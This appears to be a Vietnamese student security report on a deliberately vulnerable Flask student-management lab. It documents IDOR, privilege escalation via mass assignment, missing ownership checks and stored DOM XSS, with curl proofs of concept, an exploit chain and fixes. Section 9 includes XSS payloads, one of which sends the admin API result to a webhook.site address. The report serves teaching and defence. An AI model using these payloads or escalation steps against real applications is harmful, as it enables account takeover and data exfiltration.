# 🔐 BÁO CÁO BẢO MẬT ỨNG DỤNG WEB
## Vulnerable Web Application Lab — Broken Access Control & Stored DOM XSS

---

| Thông tin | Chi tiết |
|---|---|
| **Dự án** | Hệ thống Quản lý Sinh viên (Student Management System) |
| **Người thực hiện** | Hoàng Ngọc Lâm |
| **Vai trò** | Developer / Security Tester |
| **Thời gian** | Tháng 3/2026 — Tháng 4/2026 |
| **Công nghệ** | Python Flask · PostgreSQL · HTML/CSS/JS · Docker |
| **Mục đích** | Đồ án môn Bảo mật Ứng dụng Web — Lab thực hành phát hiện và khai thác lỗ hổng |
| **GitHub** | [https://github.com/HoangLam1337/web_vlun_broken](https://github.com/HoangLam1337/web_vlun_broken) |

---

## 📋 Mục lục

1. [Tóm tắt tổng quan (Executive Summary)](#1-tóm-tắt-tổng-quan)
2. [Phạm vi kiểm thử](#2-phạm-vi-kiểm-thử)
3. [Kiến trúc ứng dụng](#3-kiến-trúc-ứng-dụng)
4. [Phương pháp kiểm thử](#4-phương-pháp-kiểm-thử)
5. [Tổng hợp các lỗ hổng phát hiện](#5-tổng-hợp-các-lỗ-hổng-phát-hiện)
6. [BAC-01: IDOR — Truy cập trái phép dữ liệu sinh viên khác](#6-bac-01-idor--truy-cập-trái-phép-dữ-liệu-sinh-viên-khác)
7. [BAC-02: Privilege Escalation — Leo thang đặc quyền qua Profile API](#7-bac-02-privilege-escalation--leo-thang-đặc-quyền-qua-profile-api)
8. [BAC-03: Broken Function-Level Authorization — API giảng viên thiếu kiểm tra quyền sở hữu](#8-bac-03-broken-function-level-authorization--api-giảng-viên-thiếu-kiểm-tra-quyền-sở-hữu)
9. [XSS-01: Stored DOM XSS — Chèn mã JavaScript qua dữ liệu hồ sơ](#9-xss-01-stored-dom-xss--chèn-mã-javascript-qua-dữ-liệu-hồ-sơ)
10. [Chuỗi tấn công (Exploit Chain)](#10-chuỗi-tấn-công-exploit-chain)
11. [Đánh giá tác động nghiệp vụ](#11-đánh-giá-tác-động-nghiệp-vụ)
12. [Khuyến nghị khắc phục](#12-khuyến-nghị-khắc-phục)
13. [Mapping OWASP Top 10 (2021)](#13-mapping-owasp-top-10-2021)
14. [Kết luận](#14-kết-luận)

---

## 1. Tóm tắt tổng quan

Báo cáo này trình bày kết quả đánh giá bảo mật của một ứng dụng web Flask được xây dựng **có chủ đích chứa lỗ hổng** để phục vụ mục đích học tập và thực hành. Ứng dụng mô phỏng hệ thống quản lý sinh viên với ba vai trò: **Student**, **Teacher**, và **Admin**.

Qua quá trình kiểm thử, **4 lỗ hổng chính** đã được phát hiện và khai thác thành công:

| Mã | Lỗ hổng | Mức độ |
|:---:|---|:---:|
| BAC-01 | IDOR — Sinh viên xem điểm sinh viên khác | 🔴 **Cao** |
| BAC-02 | Privilege Escalation — Tự nâng quyền qua Profile API | 🔴 **Nghiêm trọng** |
| BAC-03 | Broken Function-Level Authorization — API giảng viên thiếu kiểm tra sở hữu | 🔴 **Cao** |
| XSS-01 | Stored DOM XSS — Chèn JavaScript qua `innerHTML` | 🔴 **Cao** |

Điểm đáng chú ý nhất không phải là từng lỗ hổng riêng lẻ, mà là **khả năng kết hợp chúng thành một chuỗi tấn công hoàn chỉnh**: từ một tài khoản sinh viên bình thường, kẻ tấn công có thể đọc dữ liệu trái phép, tự nâng quyền, sửa điểm, và chèn mã độc ảnh hưởng đến phiên làm việc của Admin.

**Mức độ rủi ro tổng thể: Cao (High).**

---

## 2. Phạm vi kiểm thử

### 2.1. Ứng dụng mục tiêu

```
http://127.0.0.1:5000
```

Ứng dụng chạy trên Docker (localhost), không triển khai trên môi trường production.

### 2.2. Thành phần được kiểm tra

| Thành phần | Mô tả |
|---|---|
| **Backend Routes** | `Web/app/routes/` — Các endpoint API xử lý logic nghiệp vụ |
| **Data Models** | `Web/app/models/` — Lớp truy xuất cơ sở dữ liệu |
| **Frontend Views** | `Web/app/views/` — Các template HTML render dữ liệu phía client |
| **Database Schema** | `Web/database.sql` — Cấu trúc bảng và dữ liệu mẫu |
| **Cơ chế xác thực** | Flask signed session cookie (`HttpOnly`) |

### 2.3. Ngoài phạm vi

- Mục tiêu trên internet công cộng
- Đánh cắp thông tin thực của người dùng
- Hạ tầng production
- File upload / RCE (source code hiện tại không có endpoint này)

---

## 3. Kiến trúc ứng dụng

### 3.1. Công nghệ sử dụng

| Tầng | Công nghệ |
|---|---|
| Backend | Python 3, Flask |
| Database | PostgreSQL |
| Database Driver | psycopg2 |
| Frontend | HTML, CSS, Vanilla JavaScript |
| Triển khai | Docker, Docker Compose |
| Xác thực | Flask signed session cookie (`HttpOnly`) |

### 3.2. Mô hình phân quyền

```
┌──────────────────────────────────────────────────────────────────┐
│                    Hệ thống Quản lý Sinh viên                    │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│   👨‍🎓 Student (Sinh viên)                                       │
│   ├── Xem điểm của chính mình                                   │
│   ├── Xem và cập nhật hồ sơ cá nhân                             │
│   └── ❌ Không được truy cập API của Teacher/Admin               │
│                                                                  │
│   👩‍🏫 Teacher (Giảng viên)                                      │
│   ├── Xem điểm toàn bộ sinh viên trong môn học                  │
│   ├── Cập nhật điểm sinh viên                                   │
│   └── ❌ Chỉ được truy cập môn học mình phụ trách               │
│                                                                  │
│   🔑 Admin (Quản trị viên)                                      │
│   ├── Quản lý tài khoản (tạo, xóa, đổi role)                   │
│   ├── Xem tài liệu API (`/api/docs`)                           │
│   └── Toàn quyền quản trị hệ thống                             │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### 3.3. Danh sách API

| Phương thức | Endpoint | Mô tả | Quyền |
|:---:|---|---|---|
| `POST` | `/api/auth/login` | Đăng nhập | Public |
| `POST` | `/api/auth/logout` | Đăng xuất | Authenticated |
| `GET` | `/api/profile` | Xem hồ sơ bản thân | Authenticated |
| `PUT` | `/api/profile` | Cập nhật hồ sơ ⚠️ **LỖ HỔNG** | Authenticated |
| `GET` | `/api/grades/<student_id>` | Xem điểm ⚠️ **LỖ HỔNG IDOR** | Student+ |
| `GET` | `/api/courses/<id>/grades` | Xem điểm cả lớp ⚠️ **LỖ HỔNG** | Teacher+ |
| `PUT` | `/api/grades/<id>` | Cập nhật điểm ⚠️ **LỖ HỔNG** | Teacher+ |
| `GET` | `/api/users` | Danh sách tài khoản | Admin |
| `POST` | `/api/users` | Tạo tài khoản | Admin |
| `DELETE` | `/api/users/<id>` | Xóa tài khoản | Admin |
| `PUT` | `/api/users/<id>/role` | Đổi role (hợp lệ) | Admin |
| `GET` | `/api/docs` | Tài liệu API | Admin |

### 3.4. Tài khoản thử nghiệm

| Username | Password | Role ban đầu |
|---|---|---|
| `admin` | `123456` | admin |
| `GV001` | `123456` | teacher |
| `GV002` | `123456` | teacher |
| `SV001` | `123456` | student |
| `SV002` | `123456` | student |
| `SV003` | `123456` | student |
| `SV004` | `123456` | student |

---

## 4. Phương pháp kiểm thử

### 4.1. Phương pháp

- **Code Review (Rà soát mã nguồn)**: Đọc và phân tích trực tiếp source code để xác định các điểm yếu trong logic phân quyền.
- **Dynamic Testing (Kiểm thử động)**: Gửi HTTP request thủ công qua `curl` để khai thác và chứng minh lỗ hổng trên môi trường local.

### 4.2. Tiêu chuẩn tham chiếu

- [OWASP Top 10 — 2021](https://owasp.org/Top10/)
- [OWASP API Security Top 10 — 2023](https://owasp.org/API-Security/)
- [OWASP Testing Guide v4](https://owasp.org/www-project-web-security-testing-guide/)

### 4.3. Trọng tâm phân tích

| Câu hỏi kiểm thử | Kết quả |
|---|:---:|
| Route decorator có kiểm tra quyền sở hữu đối tượng không? | ❌ Không |
| Việc thay đổi role có được giới hạn chỉ cho Admin không? | ❌ Không |
| API giảng viên có xác minh môn học thuộc sở hữu không? | ❌ Không |
| Dữ liệu từ API có được render an toàn trên trình duyệt không? | ❌ Không |

---

## 5. Tổng hợp các lỗ hổng phát hiện

| Mã | Lỗ hổng | Mức độ | Endpoint bị ảnh hưởng | OWASP Top 10 | OWASP API Top 10 |
|:---:|---|:---:|---|---|---|
| BAC-01 | IDOR | 🔴 Cao | `GET /api/grades/<student_id>` | A01: Broken Access Control | API1: BOLA |
| BAC-02 | Privilege Escalation | 🔴 Nghiêm trọng | `PUT /api/profile` | A01: Broken Access Control | API3: BOPLA, API5: BFLA |
| BAC-03 | Broken Function-Level Authorization | 🔴 Cao | `GET /api/courses/<id>/grades`, `PUT /api/grades/<id>` | A01: Broken Access Control | API1: BOLA, API5: BFLA |
| XSS-01 | Stored DOM XSS | 🔴 Cao | `profile.html`, `admin_users.html` | A03: Injection | — |

---

## 6. BAC-01: IDOR — Truy cập trái phép dữ liệu sinh viên khác

### 6.1. Thông tin chung

| Thuộc tính | Giá trị |
|---|---|
| **Mã lỗi** | BAC-01 |
| **Tên lỗi** | Insecure Direct Object Reference (IDOR) |
| **Mức độ** | 🔴 Cao (High) |
| **Endpoint** | `GET /api/grades/<student_id>` |
| **OWASP Top 10** | A01:2021 — Broken Access Control |
| **OWASP API Top 10** | API1:2023 — Broken Object Level Authorization (BOLA) |

### 6.2. Mô tả lỗ hổng

API xem điểm nhận `student_id` từ URL và trả về điểm của sinh viên đó **mà không kiểm tra** `student_id` có thuộc về người dùng đang đăng nhập hay không. Bất kỳ người dùng nào có role `student`, `teacher`, hoặc `admin` đều có thể xem điểm của **bất kỳ sinh viên nào** bằng cách thay đổi ID trên URL.

### 6.3. Mã nguồn gây lỗi

```python
# Web/app/routes/student.py
@student_bp.route('/api/grades/<int:student_id>')
@require_login
@require_role('student', 'teacher', 'admin')
def api_get_grades(student_id):
    grades = student_model.get_grades_by_student_id(student_id)
    return jsonify({
        'student_id': student_id,
        'grades': [dict(row) for row in grades]
    })
```

**Vấn đề**: Decorator `@require_role` chỉ kiểm tra người dùng có role hợp lệ hay không, **không kiểm tra** `student_id` trong URL có trùng với `user_id` trong session.

### 6.4. Bước khai thác (Proof of Concept)

**Bước 1:** Đăng nhập với tài khoản `SV004` (sinh viên bình thường):

```bash
curl -i -c cookie.txt -X POST http://127.0.0.1:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"SV004","password":"123456"}'
```

**Bước 2:** Truy cập điểm của sinh viên khác (student_id = 2, là SV002):

```bash
curl -i -b cookie.txt http://127.0.0.1:5000/api/grades/2
```

**Kết quả:** Trả về đầy đủ 3 bản ghi điểm của sinh viên `SV002`:

```json
{
  "student_id": 2,
  "grades": [
    {
      "mssv": "SV002",
      "student_name": "Tran Thi Binh",
      "course_code": "CS201",
      "course_name": "Mang may tinh",
      "score_weighted": "7.63"
    }
  ]
}
```

### 6.5. Tác động

| Tác động | Mô tả |
|---|---|
| **Bảo mật (Confidentiality)** | Sinh viên A có thể xem toàn bộ điểm, MSSV, họ tên của sinh viên B |
| **Quy mô** | Bằng cách duyệt qua các `student_id` (1, 2, 3, ...), kẻ tấn công có thể thu thập điểm của tất cả sinh viên trong hệ thống |
| **Vi phạm** | Vi phạm nguyên tắc phân quyền cấp đối tượng (Object-Level Authorization) |

---

## 7. BAC-02: Privilege Escalation — Leo thang đặc quyền qua Profile API

### 7.1. Thông tin chung

| Thuộc tính | Giá trị |
|---|---|
| **Mã lỗi** | BAC-02 |
| **Tên lỗi** | Privilege Escalation via Mass Assignment |
| **Mức độ** | 🔴 Nghiêm trọng (Critical) |
| **Endpoint** | `PUT /api/profile` |
| **OWASP Top 10** | A01:2021 — Broken Access Control |
| **OWASP API Top 10** | API3:2023 — Broken Object Property Level Authorization (BOPLA) |
| **OWASP API Top 10** | API5:2023 — Broken Function Level Authorization (BFLA) |

### 7.2. Mô tả lỗ hổng

API cập nhật hồ sơ (`PUT /api/profile`) nhận **toàn bộ dữ liệu JSON từ client** mà không giới hạn trường nào được phép cập nhật. Nếu client gửi thêm trường `role` trong request body, server sẽ:

1. Cập nhật `role` trong cơ sở dữ liệu
2. Cập nhật `role` trong session hiện tại

Điều này cho phép **bất kỳ người dùng nào** tự thay đổi role của mình thành `teacher` hoặc `admin`.

### 7.3. Mã nguồn gây lỗi

```python
# Web/app/routes/profile.py
@profile_bp.route('/api/profile', methods=['PUT'])
@require_login
def api_update_profile():
    data = request.get_json()
    user_id = session['user_id']

    # ...cập nhật các trường hồ sơ...

    # ❌ LỖ HỔNG: Nhận 'role' từ client và cập nhật trực tiếp
    if 'role' in data:
        user_model.update_role(user_id, data['role'])
        session['role'] = data['role']  # Cập nhật cả session

    return jsonify({'message': 'Cập nhật hồ sơ thành công'})
```

**Vấn đề**: Không có whitelist cho các trường được phép cập nhật. Trường `role` — vốn chỉ nên được thay đổi bởi Admin — lại có thể bị thay đổi bởi bất kỳ ai.

### 7.4. Bước khai thác (Proof of Concept)

**Bước 1:** Đăng nhập với tài khoản `SV001` (role = `student`):

```bash
curl -i -c cookie.txt -X POST http://127.0.0.1:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"SV001","password":"123456"}'
```

Xác nhận session cookie chứa `"role":"student"`:

```json
{"role":"student","user_id":4,"username":"SV001"}
```

**Bước 2:** Gửi request cập nhật profile, thêm trường `role`:

```bash
curl -i -b cookie.txt -c cookie.txt -X PUT http://127.0.0.1:5000/api/profile \
  -H "Content-Type: application/json" \
  -d '{"role":"teacher"}'
```

**Kết quả:** Server trả về `200 OK`, session cookie mới chứa `"role":"teacher"`:

```json
{"role":"teacher","user_id":4,"username":"SV001"}
```

> **Lưu ý thực tế:** Giao diện web bình thường chỉ gửi `full_name`, `email`, `phone`. Tuy nhiên, kẻ tấn công có thể dùng Burp Suite, curl, hoặc browser DevTools để chèn thêm trường `role` vào request JSON.

### 7.5. Tác động

| Tác động | Mô tả |
|---|---|
| **Leo thang dọc (Vertical)** | Sinh viên → Giảng viên → Admin |
| **Phá vỡ mô hình phân quyền** | Toàn bộ hệ thống RBAC bị vô hiệu hóa |
| **Tác động chuỗi** | Sau khi nâng quyền, kẻ tấn công có thể khai thác thêm BAC-03, XSS-01 |
| **Quy mô** | Bất kỳ tài khoản nào cũng có thể trở thành Admin |

---

## 8. BAC-03: Broken Function-Level Authorization — API giảng viên thiếu kiểm tra quyền sở hữu

### 8.1. Thông tin chung

| Thuộc tính | Giá trị |
|---|---|
| **Mã lỗi** | BAC-03 |
| **Tên lỗi** | Broken Function-Level Authorization |
| **Mức độ** | 🔴 Cao (High) |
| **Endpoint** | `GET /api/courses/<course_id>/grades`, `PUT /api/grades/<grade_id>` |
| **OWASP Top 10** | A01:2021 — Broken Access Control |
| **OWASP API Top 10** | API1:2023 — BOLA, API5:2023 — BFLA |

### 8.2. Mô tả lỗ hổng

Các API dành cho giảng viên chỉ kiểm tra **role trong session** (`teacher` hoặc `admin`) mà **không xác minh** giảng viên hiện tại có phải là người phụ trách môn học (`course`) hoặc bản ghi điểm (`grade`) đó hay không.

Kết hợp với BAC-02 (leo thang đặc quyền), một sinh viên sau khi tự nâng quyền lên `teacher` có thể:

- Xem điểm toàn bộ sinh viên trong **bất kỳ môn học nào**
- Sửa điểm của **bất kỳ bản ghi nào**

### 8.3. Mã nguồn gây lỗi

**Xem điểm cả lớp:**

```python
# Web/app/routes/teacher.py
@teacher_bp.route('/api/courses/<int:course_id>/grades')
@require_login
@require_role('teacher', 'admin')
def api_get_course_grades(course_id):
    # ❌ Không kiểm tra course_id có thuộc giảng viên hiện tại không
    grades = grade_model.get_grades_by_course_id(course_id)
    return jsonify({...})
```

**Cập nhật điểm:**

```python
# Web/app/routes/teacher.py
@teacher_bp.route('/api/grades/<int:grade_id>', methods=['PUT'])
@require_login
@require_role('teacher', 'admin')
def api_update_grade(grade_id):
    # ❌ Không kiểm tra grade_id có thuộc môn học của giảng viên hiện tại không
    grade = grade_model.get_grade_by_id(grade_id)
    grade_model.update_grade(...)
```

### 8.4. Bước khai thác (Proof of Concept)

**Bước 1:** Sau khi leo thang quyền thành `teacher` (qua BAC-02), xem điểm môn `course_id=1`:

```bash
curl -i -b cookie.txt http://127.0.0.1:5000/api/courses/1/grades
```

**Kết quả:** Trả về 4 bản ghi điểm của tất cả sinh viên trong môn `CS301 — Bao mat ung dung web`, mặc dù tài khoản `SV001` không phải là giảng viên phụ trách.

**Bước 2:** Sửa điểm `grade_id=4`:

```bash
curl -i -b cookie.txt -X PUT http://127.0.0.1:5000/api/grades/4 \
  -H "Content-Type: application/json" \
  -d '{"score_mid1":"4.25","score_mid2":"4.50","score_final":"5.00"}'
```

**Kết quả:**

| Trường | Trước | Sau |
|---|:---:|:---:|
| `score_mid1` | 8.00 | 4.25 |
| `score_mid2` | 8.00 | 4.50 |
| `score_final` | 8.50 | 5.00 |
| `score_weighted` | **8.25** | **4.69** |

### 8.5. Tác động

| Tác động | Mô tả |
|---|---|
| **Tính toàn vẹn (Integrity)** | Điểm số có thể bị sửa đổi trái phép |
| **Tính bảo mật (Confidentiality)** | Điểm toàn bộ sinh viên trong lớp bị lộ |
| **Nghiệp vụ** | Kết quả học tập không còn đáng tin cậy |

---

## 9. XSS-01: Stored DOM XSS — Chèn mã JavaScript qua dữ liệu hồ sơ

### 9.1. Thông tin chung

| Thuộc tính | Giá trị |
|---|---|
| **Mã lỗi** | XSS-01 |
| **Tên lỗi** | Stored DOM-based Cross-Site Scripting |
| **Mức độ** | 🔴 Cao (High) |
| **Sink** | `innerHTML` trong `profile.html`, `admin_users.html`, `grades.html`, `teacher_grades.html` |
| **OWASP Top 10** | A03:2021 — Injection |

### 9.2. Mô tả lỗ hổng

Các trang HTML phía client sử dụng `innerHTML` để render dữ liệu từ API vào bảng hiển thị. Khi dữ liệu chứa mã HTML/JavaScript (ví dụ: lưu trong trường `full_name`), trình duyệt sẽ **thực thi mã đó** thay vì hiển thị dưới dạng văn bản thuần.

Đây là lỗi **Stored XSS** vì payload được lưu vào cơ sở dữ liệu và tự động thực thi mỗi khi trang render dữ liệu đó.

### 9.3. Mã nguồn gây lỗi

**Trang hồ sơ (`profile.html`):**

```javascript
// ❌ Dữ liệu từ API được ghép trực tiếp vào innerHTML
tr.innerHTML = '<td><strong>' + label + '</strong></td><td>' + data[key] + '</td>';
```

**Trang quản lý tài khoản (`admin_users.html`):**

```javascript
// ❌ Dữ liệu full_name từ database được ghép vào innerHTML
tr.innerHTML =
  '<td>' + u.id + '</td>' +
  '<td>' + u.username + '</td>' +
  '<td>' + (u.full_name || '-') + '</td>' +  // ← XSS sink
  '<td>' + (u.email || '-') + '</td>';
```

### 9.4. Bước khai thác (Proof of Concept)

**Bước 1:** Chèn payload XSS vào trường `full_name` qua API profile:

```bash
curl -i -b cookie.txt -X PUT http://127.0.0.1:5000/api/profile \
  -H "Content-Type: application/json" \
  -d '{"full_name":"<img src=x onerror=fetch(\"//127.0.0.1:8787/x\")>"}'
```

**Bước 2:** Khi Admin mở trang `/admin/users`, trình duyệt render `full_name` qua `innerHTML` → payload thực thi:

```
→ Trình duyệt gửi request đến 127.0.0.1:8787/x
→ Chứng minh JavaScript đã thực thi trong phiên Admin
```

**Payload nâng cao — Chứng minh XSS có thể gọi API Admin:**

```html
<img src=x onerror="fetch('/api/users').then(r=>fetch('https://webhook.site/<id>/users?s='+r.status))">
```

Khi chạy trong phiên Admin → trả về `/users?s=200` (truy cập endpoint chỉ dành cho Admin thành công).

### 9.5. Về HttpOnly Cookie và XSS

> **Câu hỏi thường gặp:** Flask session cookie có flag `HttpOnly`, tại sao XSS vẫn nguy hiểm?

| Đặc điểm | Chi tiết |
|---|---|
| `HttpOnly` **bảo vệ** | JavaScript không thể đọc session cookie qua `document.cookie` |
| `HttpOnly` **KHÔNG bảo vệ** | JavaScript vẫn có thể gửi request same-origin, và trình duyệt **tự động gắn cookie** vào request |
| **Hệ quả** | Payload XSS có thể gọi bất kỳ API nào sử dụng phiên đăng nhập của nạn nhân mà không cần biết cookie |

### 9.6. Tác động

| Tác động | Mô tả |
|---|---|
| **Session Hijacking (gián tiếp)** | XSS gọi API bằng phiên nạn nhân, không cần đánh cắp cookie |
| **Data Exfiltration** | Có thể lấy danh sách tài khoản, điểm qua authenticated API calls |
| **Account Takeover** | Nếu Admin bị XSS, payload có thể tạo tài khoản mới, đổi role, xóa user |
| **Phạm vi** | Ảnh hưởng đến mọi người dùng mở trang có chứa dữ liệu đã bị chèn mã |

---

## 10. Chuỗi tấn công (Exploit Chain)

Bốn lỗ hổng trên có thể được **kết hợp thành một chuỗi tấn công liên hoàn** từ tài khoản sinh viên thông thường:

```
📌 Exploit Chain — Từ Student đến Full System Compromise

┌─────────────────────────────────────────────────────────┐
│ Bước 1: Đăng nhập với tài khoản Student (SV004)        │
│         → Quyền ban đầu: student                       │
└────────────────────────┬────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────┐
│ Bước 2: IDOR — Xem điểm sinh viên khác (BAC-01)       │
│         GET /api/grades/2                               │
│         → Đọc được 3 bản ghi điểm của SV002            │
│         → Vi phạm: Confidentiality                      │
└────────────────────────┬────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────┐
│ Bước 3: Privilege Escalation (BAC-02)                  │
│         PUT /api/profile  {"role":"teacher"}            │
│         → Role thay đổi: student → teacher              │
│         → Vi phạm: Authorization                        │
└────────────────────────┬────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────┐
│ Bước 4: Truy cập API Teacher (BAC-03)                  │
│         GET /api/courses/1/grades                       │
│         → Xem điểm toàn bộ 4 sinh viên trong lớp       │
│         → Vi phạm: Confidentiality + Authorization      │
└────────────────────────┬────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────┐
│ Bước 5: Sửa điểm trái phép (BAC-03)                   │
│         PUT /api/grades/4                               │
│         → score_weighted: 8.25 → 4.69                   │
│         → Vi phạm: Integrity                            │
└────────────────────────┬────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────┐
│ Bước 6: Stored DOM XSS (XSS-01)                       │
│         PUT /api/profile  {"full_name":"<img onerror..>"}│
│         → JavaScript được lưu vào DB                    │
│         → Vi phạm: Injection                            │
└────────────────────────┬────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────┐
│ Bước 7: Khai thác phiên Admin qua XSS                  │
│         Admin mở /admin/users → payload thực thi        │
│         → XSS gọi /api/users bằng phiên Admin          │
│         → Có thể tạo/xóa tài khoản, đổi role           │
│         → Vi phạm: Full System Compromise               │
└─────────────────────────────────────────────────────────┘
```

**Tại sao chuỗi này quan trọng:**

- Chứng minh rằng các lỗ hổng **không tồn tại độc lập**, mà có thể kết hợp để tạo **tác động lũy tiến** (cascading impact).
- Từ một tài khoản sinh viên bình thường, kẻ tấn công có thể đạt được **gần như toàn quyền kiểm soát hệ thống**.

---

## 11. Đánh giá tác động nghiệp vụ

### 11.1. Theo CIA Triad

| Tiêu chí | Mức độ | Chi tiết |
|---|:---:|---|
| **Confidentiality** (Bảo mật) | 🔴 Cao | Lộ thông tin cá nhân, điểm số, danh sách tài khoản |
| **Integrity** (Toàn vẹn) | 🔴 Cao | Điểm có thể bị sửa đổi, role bị thay đổi trái phép |
| **Availability** (Sẵn sàng) | 🟡 Trung bình | Tài khoản có thể bị xóa qua XSS trong phiên Admin |

### 11.2. Tác động nghiệp vụ

| Tác động | Mô tả |
|---|---|
| 📊 **Sai lệch kết quả học tập** | Điểm số bị sửa đổi → ảnh hưởng xếp loại, tốt nghiệp |
| 🔓 **Mất kiểm soát phân quyền** | Bất kỳ ai cũng có thể trở thành Admin |
| 📋 **Lộ thông tin cá nhân** | MSSV, họ tên, email, điểm số bị truy cập trái phép |
| 🏛️ **Mất niềm tin hệ thống** | Hệ thống quản lý điểm không còn đáng tin cậy |
| ⚠️ **Tấn công liên hoàn** | XSS cho phép thực hiện thao tác Admin mà không cần tài khoản Admin |

---

## 12. Khuyến nghị khắc phục

### 12.1. Bảng ưu tiên khắc phục

| Ưu tiên | Lỗ hổng | Khắc phục | Lý do |
|:---:|---|---|---|
| **P0** | BAC-02 | Loại bỏ `role` khỏi Profile API | Chặn hoàn toàn leo thang đặc quyền |
| **P0** | BAC-01 | Thêm kiểm tra quyền sở hữu trong Grades API | Chặn IDOR |
| **P0** | BAC-03 | Xác minh giảng viên sở hữu môn học | Chặn truy cập trái phép |
| **P1** | XSS-01 | Thay `innerHTML` bằng `textContent` | Chặn Stored DOM XSS |

### 12.2. Chi tiết khắc phục

#### Fix 1: Loại bỏ role khỏi Profile API (BAC-02)

```python
# ✅ FIX: Chỉ cho phép cập nhật các trường an toàn
@profile_bp.route('/api/profile', methods=['PUT'])
@require_login
def api_update_profile():
    data = request.get_json() or {}
    user_id = session['user_id']

    # Whitelist — chỉ các trường này được phép cập nhật
    allowed_fields = {'full_name', 'email', 'phone'}
    updates = {k: v for k, v in data.items() if k in allowed_fields}

    if updates:
        student_model.update_student_by_user_id(user_id, updates)

    # ❌ Không bao giờ nhận 'role' từ client
    return jsonify({'message': 'Cập nhật hồ sơ thành công'})
```

**Nguyên tắc:** Role chỉ được thay đổi qua endpoint Admin hợp lệ (`PUT /api/users/<id>/role`).

---

#### Fix 2: Kiểm tra quyền sở hữu trong Grades API (BAC-01)

```python
# ✅ FIX: Sinh viên chỉ xem được điểm của chính mình
@student_bp.route('/api/grades/<int:student_id>')
@require_login
@require_role('student', 'teacher', 'admin')
def api_get_grades(student_id):
    if session.get('role') == 'student':
        student = student_model.get_student_by_user_id(session['user_id'])
        if not student or student['id'] != student_id:
            return jsonify({'error': 'Forbidden'}), 403

    grades = student_model.get_grades_by_student_id(student_id)
    return jsonify({
        'student_id': student_id,
        'grades': [dict(row) for row in grades]
    })
```

---

#### Fix 3: Xác minh giảng viên sở hữu môn học (BAC-03)

```python
# ✅ Model helper: Kiểm tra giảng viên có sở hữu môn học không
def teacher_owns_course(user_id, course_id):
    cur = get_cursor()
    cur.execute("""
        SELECT 1
        FROM courses c
        JOIN teachers t ON c.teacher_id = t.id
        WHERE c.id = %s AND t.user_id = %s
    """, [course_id, user_id])
    row = cur.fetchone()
    cur.close()
    return row is not None
```

```python
# ✅ Controller: Áp dụng kiểm tra
if session.get('role') == 'teacher':
    if not teacher_model.teacher_owns_course(session['user_id'], course_id):
        return jsonify({'error': 'Forbidden'}), 403
```

---

#### Fix 4: Thay innerHTML bằng textContent (XSS-01)

```javascript
// ✅ FIX: Sử dụng DOM API an toàn thay vì innerHTML
function appendCell(row, value) {
  const td = document.createElement('td');
  td.textContent = value ?? '-';  // textContent tự động escape HTML
  row.appendChild(td);
}

// Sử dụng:
const tr = document.createElement('tr');
appendCell(tr, u.id);
appendCell(tr, u.username);
appendCell(tr, u.full_name);  // Dù full_name chứa <img onerror=...>, textContent sẽ hiển thị dạng text
appendCell(tr, u.email);
tbody.appendChild(tr);
```

**Áp dụng cho:** `profile.html`, `admin_users.html`, `grades.html`, `teacher_grades.html`, `admin_docs.html`.

---

## 13. Mapping OWASP Top 10 (2021)

| Vị trí | OWASP Category | Lỗ hổng trong dự án | Mô tả |
|:---:|---|---|---|
| **A01** | Broken Access Control | BAC-01, BAC-02, BAC-03 | Thiếu kiểm tra quyền sở hữu đối tượng (IDOR), cho phép leo thang đặc quyền, thiếu kiểm tra cấp hàm |
| **A03** | Injection | XSS-01 | Stored DOM XSS do dùng `innerHTML` render dữ liệu từ DB mà không escape |
| **A04** | Insecure Design | Tổng thể | Thiết kế API không áp dụng nguyên tắc least-privilege và object-level authorization từ đầu |
| **A07** | Identification & Authentication Failures | Session design | Role được lưu trong client-side session cookie (dù có mã hóa) thay vì lookup từ DB mỗi request |

### Mapping OWASP API Security Top 10 (2023)

| Vị trí | OWASP API Category | Lỗ hổng |
|:---:|---|---|
| **API1** | Broken Object Level Authorization (BOLA) | BAC-01, BAC-03 |
| **API3** | Broken Object Property Level Authorization (BOPLA) | BAC-02 |
| **API5** | Broken Function Level Authorization (BFLA) | BAC-02, BAC-03 |

---

## 14. Kết luận

### 14.1. Tổng kết

Dự án này chứng minh một **pattern thất bại phân quyền điển hình** trong ứng dụng web thực tế:

1. **Route decorator chỉ kiểm tra role** (xác thực cấp hàm) nhưng **bỏ qua quyền sở hữu đối tượng** → IDOR và Broken Function-Level Authorization.
2. **API không giới hạn trường cập nhật** (Mass Assignment) → Leo thang đặc quyền.
3. **Frontend dùng `innerHTML`** render dữ liệu từ nguồn không tin cậy → Stored DOM XSS.
4. **Các lỗ hổng kết hợp thành chuỗi tấn công**: Student → đọc dữ liệu trái phép → nâng quyền Teacher → sửa điểm → chèn XSS → khai thác phiên Admin.

### 14.2. Nguyên tắc bảo mật rút ra

```
┌──────────────────────────────────────────────────────────────┐
│              Ba tầng kiểm soát truy cập cần thiết            │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  🔐 Authentication (Xác thực)                                │
│     → Trả lời: "Bạn là ai?"                                 │
│                                                              │
│  👤 Role Check (Kiểm tra vai trò)                            │
│     → Trả lời: "Bạn thuộc nhóm người dùng nào?"             │
│                                                              │
│  🎯 Ownership Check (Kiểm tra quyền sở hữu)                │
│     → Trả lời: "Bạn có quyền truy cập đối tượng này không?" │
│                                                              │
│  ⚠️  Ứng dụng lỗi hổng chỉ thực hiện 2 tầng đầu.          │
│      Phiên bản an toàn phải thực hiện cả 3 tầng.            │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

### 14.3. Kỹ năng thể hiện qua dự án

| Kỹ năng | Mô tả |
|---|---|
| ✅ Code Review | Phân tích logic phân quyền ở tầng route/controller Flask |
| ✅ Vulnerability Assessment | Phát hiện IDOR, Privilege Escalation, BFLA, Stored DOM XSS |
| ✅ Exploit Development | Xây dựng chuỗi tấn công liên hoàn có kiểm soát |
| ✅ Impact Analysis | Đánh giá tác động theo CIA Triad và nghiệp vụ |
